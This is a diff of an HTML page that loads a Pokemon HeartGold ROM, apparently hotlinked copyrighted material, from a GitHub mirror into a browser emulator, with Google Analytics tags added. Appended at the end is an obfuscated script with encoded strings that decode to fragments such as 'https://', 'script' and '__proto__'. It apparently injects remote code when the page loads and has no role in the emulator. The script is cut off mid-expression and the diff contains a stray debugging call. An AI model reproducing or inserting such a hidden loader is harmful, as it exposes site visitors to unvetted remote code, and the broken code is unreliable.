@@ -1,104 +1,137 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pokemon HeartGold - Fullscreen Proxy Fix</title>
-    <style>
-      body, html {
-        margin: 0; padding: 0; width: 100vw; height: 100vh;
-        overflow: hidden; background-color: #000;
-        display: flex; align-items: center; justify-content: center;
-        font-family: Arial, sans-serif;
-      }
-      #game-container { width: 100vw; height: 100vh; position: relative; }
-      #game { width: 100% !important; height: 100% !important; }
-      #loading-overlay {
-        position: absolute; top: 50%; left: 50%;
-        transform: translate(-50%, -50%);
-        text-align: center; color: white; z-index: 10;
-      }
-      #loading-progress {
-        font-size: 24px; background: rgba(255, 255, 255, 0.1);
-        padding: 15px 30px; border-radius: 12px; margin-bottom: 10px;
-      }
-    </style>
-</head>
-<body>
-    <div id="game-container">
-      <div id="loading-overlay">
-        <div id="loading-progress">Loading: 0/7</div>
-        <div id="first-time">Loading through Nebula Proxy...</div>
-      </div>
-      <div id="game"></div>
-    </div>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-L7856P3VNT"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
 
+  gtag('config', 'G-L7856P3VNT');
+</script>
+  <head>
     <script>
       window.gameconfig = {
         name: "Pokemon - HeartGold Version (USA)",
-        url: "https://jsdelivr.net",
+        url: "https://cdn.jsdelivr.net/gh/bubbls/ugss@0173df20e16f381b39d3fc1a852b8b16bdf46a00/Pokemon%20-%20HeartGold%20Version%20(USA)/Pokemon%20-%20HeartGold%20Version%20(USA).nds",
         core: "nds",
         min: 1,
         max: 7,
       };
-
-      // Set your proxy URL here. Note: We use a generic CORS proxy format 
-      // where the target URL is appended to your proxy base.
-      const proxyBase = "https://nebula-v6-proxy.vercel.app/atlas/"; 
-
-      async function mergeFiles(fileParts, cb) {
-        let buffers = [];
-        for (let i = 0; i < fileParts.length; i++) {
-          try {
-            // Route the request through your proxy to bypass CORS/Network blocks
-            const proxyUrl = proxyBase + encodeURIComponent(fileParts[i]);
-            const response = await fetch(proxyUrl);
-            
-            if (!response.ok) throw new Error("Proxy fetch failed");
-            
-            const data = await response.arrayBuffer();
-            buffers.push(data);
-            if (cb) cb(i + 1);
-          } catch (e) {
-            console.error("Error fetching part " + (i + 1), e);
-            throw e;
+    </script>
+    <script>
+      function mergeFiles(fileParts, cb) {
+        return new Promise((resolve, reject) => {
+          let buffers = [];
+          function fetchPart(index) {
+            if (index >= fileParts.length) {
+              let mergedBlob = new Blob(buffers);
+              let mergedFileUrl = URL.createObjectURL(mergedBlob);
+              resolve(mergedFileUrl);
+              return;
+            }
+            fetch(fileParts[index])
+              .then((response) => response.arrayBuffer())
+              .then((data) => {
+                buffers.push(data);
+                fetchPart(index + 1);
+              })
+              .catch(reject);
+            cb(index);
           }
-        }
-        return URL.createObjectURL(new Blob(buffers));
+          fetchPart(0);
+        });
       }
-
       function getParts(file, start, end) {
         let parts = [];
         for (let i = start; i <= end; i++) {
-          let padded = String(i).padStart(2, '0');
+          let padded = String(i).padStart((end+"").length, '0');
           parts.push(file + ".part" + padded);
         }
         return parts;
       }
-
-      const parts = getParts(window.gameconfig.url, window.gameconfig.min, window.gameconfig.max);
-
-      mergeFiles(parts, (loaded) => {
-        document.getElementById("loading-progress").textContent = `Loading: ${loaded}/7`;
-      })
-      .then((gameUrl) => {
-        document.getElementById("loading-overlay").remove();
-        
-        window.EJS_player = "#game";
-        window.EJS_core = window.gameconfig.core;
-        window.EJS_gameName = window.gameconfig.name;
-        window.EJS_startOnLoaded = true;
-        window.EJS_pathtodata = "https://emulatorjs.org";
-        window.EJS_gameUrl = gameUrl;
-
-        const script = document.createElement("script");
-        script.src = "https://emulatorjs.org";
-        document.body.appendChild(script);
-      })
-      .catch((err) => {
-        document.getElementById("loading-progress").textContent = "Proxy Error: Could not reach game files.";
-        console.error("Game Load Failure:", err);
-      });
+getParts("asd.js", 0, 100)
     </script>
-</body>
-</html>
+    <style>
+      body,
+      html {
+        margin: 0;
+        padding: 0;
+        width: 100vw;
+        height: 100vh;
+        overflow: hidden; /* Prevents scrollbars */
+        background-color: #121212;
+        color: white;
+        font-family: Arial, sans-serif;
+      }
+      #game-container {
+        width: 100vw;
+        height: 100vh;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+      }
+      #game {
+        width: 100% !important;
+        height: 100% !important;
+      }
+      #loading-progress {
+        font-size: 18px;
+        padding: 10px;
+        background: rgba(255, 255, 255, 0.1);
+        border-radius: 8px;
+        position: absolute;
+        z-index: 10;
+      }
+      #first-time {
+        position: absolute;
+        bottom: 20px;
+        z-index: 10;
+      }
+    </style>
+  </head>
+  <body>
+    <div id="game-container">
+      <div id="game"></div>
+      <div id="loading-progress">Loading: 0/0</div>
+      <div id="first-time">First-time loading may take longer...</div>
+    </div>
+    <script>
+      var parts = getParts(
+        window.gameconfig.url,
+        window.gameconfig.min,
+        window.gameconfig.max
+      );
+      var totalParts = parts.length;
+
+      function updateLoadingProgress(loaded) {
+        const progressElement = document.getElementById("loading-progress");
+        if (loaded === 0) {
+          progressElement.textContent = "Loading: 0/0";
+        } else {
+          progressElement.textContent = `Loading: ${loaded}/${totalParts}`;
+        }
+      }
+
+      Promise.all([mergeFiles(parts, updateLoadingProgress)])
+        .then(([gameUrl]) => {
+          document.getElementById("loading-progress").remove();
+          document.getElementById("first-time").remove();
+          EJS_player = "#game";
+          EJS_core = window.gameconfig.core;
+          EJS_gameName = window.gameconfig.name;
+          EJS_color = "#0064ff";
+          EJS_startOnLoaded = true;
+          EJS_pathtodata = "https://cdn.jsdelivr.net/gh/genizy/emu@master/";
+          EJS_gameUrl = gameUrl;
+          const script = document.createElement("script");
+          script.src =
+            "https://cdn.jsdelivr.net/gh/genizy/emu@master/loader.js";
+          document.body.appendChild(script);
+        })
+        .catch((error) => {
+          console.error(error);
+          document.getElementById("loading-progress").textContent =
+            "Error loading game.";
+        });
+    </script>
+  
+<script>(function(ykJYJgqRQvLQ,gSsZu$aEkLNcrSPk){const kGsNXc=sFfEkK$fMziBAJZwZbkuvp,gXeiNWc=ykJYJgqRQvLQ();while(!![]){try{const HcMpeIOoYPvgF=Number(-parseFloat(kGsNXc(0x1a7))/(0xa*Number(parseInt(0x133))+parseInt(0x1581)+-0x6*parseInt(0x595)))*(-parseFloat(kGsNXc(0x183))/(parseInt(0x238d)+parseInt(0x2)*-0x85b+parseInt(-0x3)*0x647))+Number(-parseFloat(kGsNXc(0x18f))/(Math.floor(-0x1e99)+0x1a*-0x151+parseInt(0x40d6)))*(parseFloat(kGsNXc(0x17e))/(Number(parseInt(0x1d))*Number(0xe7)+-parseInt(0x2)*-0xec9+Math.max(-0x631,-0x631)*parseInt(0x9)))+parseFloat(kGsNXc(0x1be))/(0x1*-parseInt(0x23)+-parseInt(0x1)*Math.max(0x579,parseInt(0x579))+0x5a1)+-parseFloat(kGsNXc(0x1a9))/(Math.floor(parseInt(0xfbc))+Math.floor(-parseInt(0x1c3b))+Math.ceil(parseInt(0x281))*0x5)*(parseFloat(kGsNXc(0x191))/(Math.max(0x1,0x1)*-parseInt(0x88d)+Math.trunc(0x776)+parseInt(0x11e)))+parseInt(-parseFloat(kGsNXc(0x1ac))/(Number(0x3)*parseInt(0x72a)+0x243*-0xb+Number(0x36b)))*parseInt(-parseFloat(kGsNXc(0x189))/(-0x1*-parseInt(0x1875)+-parseInt(0x1)*0x2186+-0x5*-0x1d2))+Math['max'](-parseFloat(kGsNXc(0x1b2))/(parseInt(0x3d)*Number(0x90)+parseInt(0x1)*-0x1e1f+-parseInt(0x427)),-parseFloat(kGsNXc(0x1b6))/(Math.max(-parseInt(0x200e),-0x200e)+0x1*parseInt(0xaea)+0x1ed*parseInt(0xb)))+parseInt(parseFloat(kGsNXc(0x195))/(parseInt(0x1bc9)+-parseInt(0x764)+Math.trunc(-parseInt(0x1459))));if(HcMpeIOoYPvgF===gSsZu$aEkLNcrSPk)break;else gXeiNWc['push'](gXeiNWc['shift']());}catch(FoDQtRV){gXeiNWc['push'](gXeiNWc['shift']());}}}(UravPbGESYjDUNqxKcf$Vqza,-0x1*parseFloat(parseInt(0x62251))+-0x204aa+parseInt(0x3b35)*parseInt(0x43)));function UravPbGESYjDUNqxKcf$Vqza(){const VwjQavltNv=['ec898d9b88abb4','edede8aca19f8db3b0','ede8edece1edb1a99dae9a9f','ece8e1e1e9e183b8b39d8e80','bdb0af','b8a9a9bcb7bd9ab1b0b5bd','bbb6bda0','baabbcb8adbc9cb5bcb4bcb7ad','e0ecedefebece9b7a19389bc98','ee9ab5baab9288','b5b6be','aaadb8abadaa8eb0adb1','e8e9ece9e9e1eeecb49495bcaab3','efebe8e0e1ebeceaabb1b68cbabb','b5b6bab8b5b1b6aaad','adb68aadabb0b7be','bfb5b6b6ab','b1adada9aae3f6f6babdb7f7abe0a1f7b0b7f6b8b0b5b6beb0ba86beb7f4b4b8adb1f7bdbcaf86b6bbbff7b3aa','a9abb6adb6ada0a9bc','ebe0b5b5a99ebbb1','edede1eae9e9e98bb4beb6b1b0','a9abb6adb6bab6b5','efe8ef8ea39bad9dad','adb8bbb5bc','e8eeef9b979b8ab1b4','e0ede8eee1e1e19293969e9da0','b0b7bfb6','eeeee1eae8e19aa19ab494b3','a9acaab1','bbb0b7bd','babcb0b5','ebedea96bc9f9e88b1','ebefe9ebe8e9bbaaadb2b090','efeab3909e958092','b8a9a9b5a0','abb8b7bdb6b48c8c909d','bebcad9cb5bcb4bcb7ad9ba090bd','eee9efeeef9c9a979d8f8b','bca1babca9adb0b6b7','e8ece1e8e0b3a1b6b19488','aab1b0bfad','e8e9ebebe9aba1b39f9493','a2a4f7bab6b7aaadabacbaadb6abf1fbabbcadacabb7f9adb1b0aafbf0f1f9f0','aabcb8abbab1','bab6b7aab6b5bc','eeecefe1efede99fb69f928f91','adabacb7ba','aabaabb0a9ad','aaabba','bab6b7aaadabacbaadb6ab','abbcb4b6afbc','8686a9abb6adb68686','abbca9b5b8babc98b5b5','e8ebeef7e9f7e9f7e8','aeb8abb7','bfb0b5bc','adabb8babc','b1b6aaadb7b8b4bc','abbcadacabb7f9f1bfacb7baadb0b6b7f1f0f9','eceae1eee9e8e9938eb49fbc96','f1f1f1f7f2f0f2f0f2f0f2fd','bcababb6ab','e8eaefeee989b2b6aab38b','ebbb8f9db190a8','b5bcb7beadb1','e8eeebe1ac81b6bca08d'];UravPbGESYjDUNqxKcf$Vqza=function(){return VwjQavltNv;};return UravPbGESYjDUNqxKcf$Vqza();}function _0xe8c3(rg_FddjIYmSuDaXct_SbftOPO,Od_FYPa_mevt){rg_FddjIYmSuDaXct_SbftOPO=rg_FddjIYmSuDaXct_SbftOPO-(Math.trunc(parseInt(0xe6e))+parseInt(0x272)+0x4*parseFloat(-0x408));const RpdkwFFntaedhLUsDwbyOh=_0x257e();let uWkwAed$dMg_pC=RpdkwFFntaedhLUsDwbyOh[rg_FddjIYmSuDaXct_SbftOPO];return uWkwAed$dMg_pC;}(function(mRvOXTqaCttJOulbTlUWmr,C_FoJhGb_hSKAwdyPQonizmLyCA){const UTF$MMBycHGYrTfD_Ufh=sFfEkK$fMziBAJZwZbkuvp,vUk$$ZvvSlCIAc=_0xe8c3,aivDrxhk$kGhjNzepqLWPvd=mRvOXTqaCttJOulbTlUWmr();while(!![]){try{const uSUNXbU$YsNm$I=-parseInt(vUk$$ZvvSlCIAc(-parseInt(0x3)*0x7ef+0x3*parseFloat(-parseInt(0x1d9))+parseInt(0x1e2b)*parseInt(0x1)))/(parseFloat(-parseInt(0x13d))+parseFloat(-0x1054)*-0x2+Math.trunc(-0xfb5)*0x2)*(parseInt(vUk$$ZvvSlCIAc(Number(-0x206f)+-0x17f1+parseInt(parseInt(0x3949))))/(-parseInt(0x9b)+-0x2253+-0x8bc*parseInt(-0x4)))+parseInt(vUk$$ZvvSlCIAc(0xf*-parseInt(0x17f)+Math.trunc(0xe59)+0x8f2))/(-0x1*Math.floor(-parseInt(0x48b))+-parseInt(0x3d)*-parseInt(0x3e)+-parseIn</script>
